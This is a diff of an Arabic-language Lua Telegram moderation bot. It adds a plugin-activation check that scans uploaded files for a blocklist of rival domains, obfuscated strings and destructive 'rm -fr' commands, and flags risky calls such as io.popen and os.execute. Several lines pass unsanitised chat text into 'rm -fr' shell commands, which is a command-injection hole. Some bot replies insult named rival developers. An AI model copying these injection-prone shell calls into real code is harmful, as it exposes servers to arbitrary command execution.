+function MohaMeDe_info2(k1,k2)
 function dl_cb222(t1,t2)
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
@@ -2330,23 +2176,23 @@ if link.ok == true then
   t2.invite_link_ = link.result
 end
 end
-database:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-send(tostring((database:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي المنشئ ~⪼ ("..msg.sender_user_id_..")\n☑️┇معرف المنشئ ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
+datahmade:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
+send(tostring((datahmade:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي المنشئ ~⪼ ("..msg.sender_user_id_..")\n☑️┇معرف المنشئ ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
 }, dl_cb222, nil)
 end
-openChat(msg.chat_id_,thsake_info2) 
+openChat(msg.chat_id_,MohaMeDe_info2) 
 --
 if data.result.can_promote_members  then
-database:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)
 end
-database:set( 'MohaMeD:'..bot_id.."enable:"..msg.chat_id_,true)
+datahmade:set( 'MohaMeD:'..bot_id.."enable:"..msg.chat_id_,true)
 if data.result.status == 'creator' then
-database:sadd('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_)
-database:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 else
@@ -2361,164 +2207,28 @@ getUser(msg.sender_user_id_, TSby)
 return false
 end
 ------------------------------------------------------------------------
-if is_devabas(msg) then
-if text == 'جلب نسخه احتياطيه' then
-local list = database:smembers('MohaMeD:'..bot_id.."groups")  
-local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
-for k,v in pairs(list) do   
-NAME = 'MohaMeD Chat'
-link = database:get('MohaMeD:'..bot_id.."group:link"..v) or ''
-MNSH = database:smembers('MohaMeD:'..bot_id..'creator:'..v)
-MDER = database:smembers('MohaMeD:'..bot_id..'owners:'..v)
-MOD = database:smembers('MohaMeD:'..bot_id..'mods:'..v)
-ASAS = database:smembers('MohaMeD:'..bot_id..'creatorbasic:'..v)
-if k == 1 then
-t = t..'"'..v..'":{"MohaMeD":"'..NAME..'",'
-else
-t = t..',"'..v..'":{"MohaMeD":"'..NAME..'",'
-end
-if #ASAS ~= 0 then 
-t = t..'"ASAS":['
-for k,v in pairs(ASAS) do
-if k == 1 then
-t =  t..'"'..v..'"'
-else
-t =  t..',"'..v..'"'
-end
-end   
-t = t..'],'
-end
-if #MOD ~= 0 then
-t = t..'"MOD":['
-for k,v in pairs(MOD) do
-if k == 1 then
-t =  t..'"'..v..'"'
-else
-t =  t..',"'..v..'"'
-end
-end   
-t = t..'],'
-end
-if #MDER ~= 0 then
-t = t..'"MDER":['
-for k,v in pairs(MDER) do
-if k == 1 then
-t =  t..'"'..v..'"'
-else
-t =  t..',"'..v..'"'
-end
-end   
-t = t..'],'
-end
-if #MNSH ~= 0 then
-t = t..'"MNSH":['
-for k,v in pairs(MNSH) do
-if k == 1 then
-t =  t..'"'..v..'"'
-else
-t =  t..',"'..v..'"'
-end
-end   
-t = t..'],'
-end
-t = t..'"linkgroup":"'..link..'"}' or ''
-end
-t = t..'}}'
-local File = io.open('./libs/'..bot_id..'.json', "w")
-File:write(t)
-File:close()
-tdcli.sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './libs/'..bot_id..'.json', '📮┇ عدد مجموعات التي في البوت { '..#list..'}')
-end
-if text == 'رفع النسخه الاحتياطيه' then   
-if tonumber(msg.reply_to_message_id_) > 0 then
-function by_reply(extra, result, success)   
-if result.content_.document_ then 
-local ID_FILE = result.content_.document_.document_.persistent_id_ 
-local File_Name = result.content_.document_.file_name_
-add_file(msg,msg.chat_id_,ID_FILE,File_Name)
-end   
-end
-tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
-end
-end
-if text == "متجر الملفات" or text == 'المتجر' then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/MohaMeDabas/files_MohaMeD/master/getfile.json")
-if res == 200 then
-local Get_info, res = pcall(JSON.decode,Get_Files);
-if Get_info then
-local TextS = "\n📂┇اهلا بك في متجر ملفات ماثيو \n📮┇الملفات الموجوده حاليا \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n\n"
-local TextE = "\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n📌┇تدل علامة (✔) الملف مفعل\n".."📌┇تدل علامة (✖) الملف معطل\n"
-local NumFile = 0
-for name in pairs(res.plugins_) do
-local Check_File_is_Found = io.open("files_MohaMeD/"..name,"r")
-if Check_File_is_Found then
-io.close(Check_File_is_Found)
-CeckFile = "(✔)"
-else
-CeckFile = "(✖)"
-end
-NumFile = NumFile + 1
-TextS = TextS..'*'..NumFile.."~⪼* {`"..name..'`} » '..CeckFile..'\n[- Info file](t.me/MohaMeDTEAM)\n'
-end
-send(msg.chat_id_, msg.id_, 1,TextS..TextE, 1, 'md') 
-end
-else
-send(msg.chat_id_, msg.id_, 1,"📮┇ لا يوجد اتصال من ال api \n", 1, 'md') 
-end
-return false
-end
-
+if is_devahmad(msg) then
 if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
 local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
-local file = name_t[2]..'.lua'
-local file_bot = io.open("files_MohaMeD/"..file,"r")
-if file_bot then
-io.close(file_bot)
-t = "*🗂┇ الملف » {"..file.."}\n📬┇ تم تعطيله وحذفه بنجاح \n✓*"
-database:srem("files"..bot_id,file)
-else
-t = "*📬┇ بالتاكيد تم تعطيل وحذف ملف » {"..file.."} \n✓*"
-database:srem("files"..bot_id,file)
-end
-local json_file, res = https.request("https://raw.githubusercontent.com/MohaMeDabas/files_MohaMeD/master/files_MohaMeD/"..file)
-if res == 200 then
-os.execute("rm -fr files_MohaMeD/"..file)
-send(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
-dofile('MohaMeD.lua')  
-else
-send(msg.chat_id_, msg.id_, 1,"*📮┇ عذرا لا يوجد هاكذا ملف في المتجر *\n", 1, 'md') 
-end
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, "🔌┇تم تعطيل {"..name_t[2]..".lua}", 1, 'html')
 return false
 end
-if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
-local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
-local file = name_t[2]..'.lua'
-local file_bot = io.open("files_MohaMeD/"..file,"r")
-if file_bot then
-io.close(file_bot)
-t = "*📬┇ بالتاكيد تم تنزيل وتفعيل ملف » {"..file.."} \n✓*"
-database:sadd("files"..bot_id,file)
-else
-t = "*🗂┇ الملف » {"..file.."}\n📬┇ تم تنزيله وتفعيله بنجاح \n💥*"
-database:sadd("files"..bot_id,file)
-end
-local json_file, res = https.request("https://raw.githubusercontent.com/MohaMeDabas/files_MohaMeD/master/files_MohaMeD/"..file)
-if res == 200 then
-local chek = io.open("files_MohaMeD/"..file,'w+')
-chek:write(json_file)
-chek:close()
-send(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
-dofile('MohaMeD.lua')  
-else
-send(msg.chat_id_, msg.id_, 1,"*📮┇ عذرا لا يوجد هاكذا ملف في المتجر *\n", 1, 'md') 
-end
-return false
-end
-
 if text == ("مسح جميع الملفات") then
-database:del("files"..bot_id)
-os.execute("rm -fr files_MohaMeD/*")
+datahmade:del("files"..bot_id)
 send(msg.chat_id_, msg.id_, 1, "🗑┇تم حذف جميع الملفات", 1, 'html')
+return false
+end
+if text and text:match("^(حذف ملف) (.*)(.lua)$") then
+local name_t = {string.match(text, "^(حذف ملف) (.*)(.lua)$")}
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, "✖┇تم حذف {"..name_t[2]..".lua}", 1, 'html')
+return false
+end
+if text and text:match("^اضف ملف$") then
+send(msg.chat_id_, msg.id_, 1, " 📥┇ ارسل ملف الان", 1, 'html')
+datahmade:set("addfiel"..msg.sender_user_id_,"yes")
 return false
 end
 if text and text:match("^(جلب ملف) (.*)(.lua)$") then
@@ -2530,7 +2240,7 @@ io.popen(curl)
 end
 
 if (text == 'الملفات' ) then
-local files_MohaMeD = database:smembers("files"..bot_id)
+local files_MohaMeD = datahmade:smembers("files"..bot_id)
 local files = io.popen('cd files_MohaMeD && ls'):read("*all")
 local files_MohaMeD2 = ''
 for i=1,#files_MohaMeD do
@@ -2538,26 +2248,260 @@ files_MohaMeD2 = files_MohaMeD2..'{'..files_MohaMeD[i]..'}\n'
 end
 send(msg.chat_id_, msg.id_, 1, '☑┇جميع الملفات : \n '..files..'\n ---------------------- \n\n✔┇الملفات المفعله \n'..files_MohaMeD2..'', 1, 'html')
 end
-
+if text and text:match("^(تفعيل ملف) (.*)(.lua)$")then
+local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
+function load(filename)
+local f = io.open(filename)
+if not f then
+return "true"
+end
+local s = f:read('*all')
+f:close()
+return s
+end
+local f = load("files_MohaMeD/"..name_t[2]..".lua")
+if (f:match('^(.*)(http://botlua.tk)(.*)$')) then 
+if (f:match('^(.*)(/getChatMember?chat_id=)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+end
+if (f:match('^(.*)(-fr MohaMeD.lua)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(-fr MohaMeD.lua)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(IvcPABLBxlAUpHrZPZOsdEZwDEnJvzxdWBUxdGZBSAwhhPhYPXqTBpqfVEPqenv_PpyUXyvPaSYiH)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(ySCizzlpoPhdJWgM_nJTwfqQRvrxBulanOiOovdEklIViPHjdqdAwurnQJMreYstNBhcXmHiyqdHfLSjc)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(ECK_DlbSbexCHcccxDRceTvmkgNPstHXXrZAD_sGgRiPVmTsQKwWETiPaXFtrmroFqQjsiQA_apWmipdUM_yFk)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(zemsWSvaA_nPcFABEzvtANFAbshqKAEkG)(.*)$')) then 
+ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(22MohaMeD)(.*)(bot_id)(.*)$')) then 
+ts23kk =  "\n⚠️┇عمي صدك جذب لول وكيكو كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(2fmaster)(.*)(MohaMeD)(.*)(elua)(.*)$')) then 
+ts23kk =  "\n⚠️┇عمي صدك جذب لول وكيكو كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(https://botlua.tk)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(MohaMeD.gq)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(Futils.lua)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(FMohaMeDTEAM)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(MohaMeD.gq)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(down.php)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(MohaMeDTEAM/MohaMeDx)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(raw.githubusercontent.com)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(rm -rf Tsh)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(botlua.tk)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(rm -fr MohaMeD.lua)(.*)$')) then 
+ts23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف MohaMeD.lua لتبعبص ابني "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(MohaMeD.lua)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(t.me/HHHHD)(.*)$')) then 
+ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(/getChatMember?chat_id=)(.*)$')) then 
+ts23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف MohaMeD.lua لتبعبص ابني "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(22MohaMeD%3a%22%20%2e%2e%20bot_id)(.*)$')) then 
+ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(2fmaster%2fMohaMeD%2elua)(.*)$')) then 
+ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+if (f:match('^(.*)(22hake)(.*)$')) then 
+ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
+datahmade:srem("files"..bot_id,name_t[2]..'.lua')
+io.popen("rm -fr files_MohaMeD/"..name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
+return false 
+end
+io.popen("rm -fr files_MohaMeD/del.lua")
+io.popen("rm -fr files_MohaMeD/hack.lua")
+io.popen("rm -fr files_MohaMeD/d.lua")
+if f ~= "true" then
+ts23 = ""
+if f:match("^(.*)(ahmad_MohaMeD)(.*)$") then
+if f:match("^(.*)(function send)(.*)$") then
+ts23 = ts23 .. "\n⚠┇ارسال رسال نصيه"
+end
+if (f:match("^(.*)(sudo.lua)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى توكن البوت وايدي المطور الاساسي"
+end
+if (f:match("^(.*)(io.popen)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
+end
+if (f:match("^(.*)(os.execute)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
+end
+if (f:match("^(.*)(redis)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇الوصول الى خزن البوت"
+end
+if (f:match("^(.*)(rm -fr)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇حذف ملفات او مجلدات"
+end
+if (f:match("^(.*)(encode)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇التصال بapi خارجي"
+end
+if (f:match("^(.*)(api.telegram.org/bot)(.*)$")) then 
+ts23 = ts23 .. "\n⚠┇قد يسبب الضعف في البوت"
+end
+datahmade:sadd("files"..bot_id,name_t[2]..'.lua')
+send(msg.chat_id_, msg.id_, 1, "✔┇تم تفعيل {"..name_t[2]..".lua}\n"..ts23, 1, 'html')
+else
+send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس سنايبر \n 🦁┇[ملفات يدعمها سورس سنايبر](t.me/MohaMeDTEAM)', 1, 'md')
+end
+else
+send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس سنايبر \n 🦁┇[ملفات يدعمها سورس سنايبر](t.me/MohaMeDTEAM)', 1, 'md')
+end
+end
 if text == ("مسح قائمه العام") then
 text = '☑┇تم مسح قائمه العام'
-database:del('MohaMeD:'..bot_id..'gbanned:')
+datahmade:del('MohaMeD:'..bot_id..'gbanned:')
 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 return false
 end
 if text == ("مسح المكتومين عام") then
 text = '☑┇ تم مسح المكتومين عام'
-database:del('MohaMeD:'..bot_id..'gmuted:')
+datahmade:del('MohaMeD:'..bot_id..'gmuted:')
 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 return false
 end
 ------------------------------------------------------------------------
 if text == ("قائمه العام") then
 local hash =   'MohaMeD:'..bot_id..'gbanned:'
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "⛔┇قائمة الحظر العام  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -2578,10 +2522,10 @@ end
 ------------------------------------------------------------------------
 if  text == ("المكتومين عام") then
 local hash =   'MohaMeD:'..bot_id..'gmuted:'
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "⛔┇قائمة الكتم العام  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -2607,7 +2551,7 @@ send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور ال�
 return false 
 end
 local hash =  'MohaMeD:'..bot_id..'gbanned:'
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 chat_kick(result.chat_id_, result.sender_user_id_)
 tsX000("prore",msg,"🚫┇تم حظره من مجموعات البوت")
 end
@@ -2629,7 +2573,7 @@ return false
 end
 local hash =  'MohaMeD:'..bot_id..'gbanned:'
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'MohaMeDTEAM')..')\n🚫┇تم حظره من المجموعات البوت'
-database:sadd(hash, result.id_)
+datahmade:sadd(hash, result.id_)
 else
 texts = '✖┇خطاء'
 end
@@ -2646,7 +2590,7 @@ send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور ال�
 return false 
 end
 local hash =  'MohaMeD:'..bot_id..'gbanned:'
-database:sadd(hash, apbll[2])
+datahmade:sadd(hash, apbll[2])
 tsX000(apbll[2],msg,"🚫┇تم حظره من المجموعات البوت")
 return false
 end
@@ -2655,7 +2599,7 @@ if text == ("الغاء العام") and msg.reply_to_message_id_ then
 function ungban_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'gbanned:'
 tsX000("prore",msg,"🚫┇تم الغاء حظره من المجموعات البوت")
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
 return false
@@ -2667,7 +2611,7 @@ function ungban_by_username(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'gbanned:'
 if result.id_ then
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'MohaMeDTEAM')..')\n��┇تم الغاء حظره من المجموعات البوت'
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 else
 texts = '✖┇خطاء'
 end
@@ -2680,7 +2624,7 @@ end
 if text and text:match("^الغاء العام (%d+)$") then
 local apbll = {string.match(text, "^(الغاء العام) (%d+)$")}
 local hash =  'MohaMeD:'..bot_id..'gbanned:'
-database:srem(hash, apbll[2])
+datahmade:srem(hash, apbll[2])
 tsX000(apbll[2],msg,"🚫┇تم الغاء حظره من مجموعات البوت")
 return false
 end
@@ -2688,11 +2632,11 @@ end
 if text == ("كتم عام") and msg.reply_to_message_id_ then
 function gmute_by_reply(extra, result, success)
 if result.sender_user_id_ == tonumber(sudo_add) then
-send(msg.chat_id_, msg.id_, 1, "📛┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
+send(msg.chat_id_, msg.id_, 1, "??┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
 local hash =  'MohaMeD:'..bot_id..'gmuted:'
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,"🚫┇تم كتمه من المجموعات البوت")
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,gmute_by_reply)
@@ -2713,7 +2657,7 @@ return false
 end
 local hash =  'MohaMeD:'..bot_id..'gmuted:'
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'MohaMeDTEAM')..')\n🚫┇تم كتمه من المجموعات البوت'
-database:sadd(hash, result.id_)
+datahmade:sadd(hash, result.id_)
 else
 texts = '✖┇خطاء'
 end
@@ -2730,7 +2674,7 @@ send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور ال�
 return false 
 end
 local hash =  'MohaMeD:'..bot_id..'gmuted:'
-database:sadd(hash, apbll[2])
+datahmade:sadd(hash, apbll[2])
 tsX000(apbll[2],msg,"🚫┇تم كتمه من المجموعات البوت")
 return false
 end
@@ -2739,7 +2683,7 @@ if text == ("الغاء كتم العام") and msg.reply_to_message_id_ then
 function ungmute_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'gmuted:'
 tsX000("prore",msg,"🚫┇تم الغاء كتمه من المجموعات البوت")
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,ungmute_by_reply)
 return false
@@ -2751,7 +2695,7 @@ function ungmute_by_username(extra, result, success)
